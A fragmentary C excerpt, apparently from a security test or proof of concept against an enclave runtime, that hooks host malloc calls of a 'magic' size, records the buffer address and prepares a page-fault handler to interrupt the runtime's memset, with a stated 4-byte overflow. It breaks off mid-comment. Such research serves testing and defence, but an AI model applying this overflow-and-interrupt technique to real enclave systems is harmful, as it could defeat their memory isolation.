...
// This is the magic malloc buffer size to trigger on
#define MAGIC_MALLOC_SIZE 1632
// This is the amount by which we overflow the buffer
#define MAGIC_INCR          4

// Cache the malloc()ed target buffer
static uint64_t magic_alloc_addr = 0x0;

uint64_t GetMagicAllocAddr(void)
{
    return magic_alloc_addr;
}
...
void HandleMalloc(uint64_t arg_in, uint64_t* arg_out)
{
    ...
    if (arg_out)
    {
        *arg_out = (uint64_t)malloc(arg_in);
        ...
        // Buffer malloc()ed magic buffer address here
        if(magic_alloc == 1)
        {
            magic_alloc_addr = *arg_out;
            OE_TRACE_FATAL("Magic malloc(): exporting address %p\n", magic_alloc_addr);

            // Now setup a PF handler on this buffer to break when the enclave runtime
            // does the memset() in oe_host_calloc()
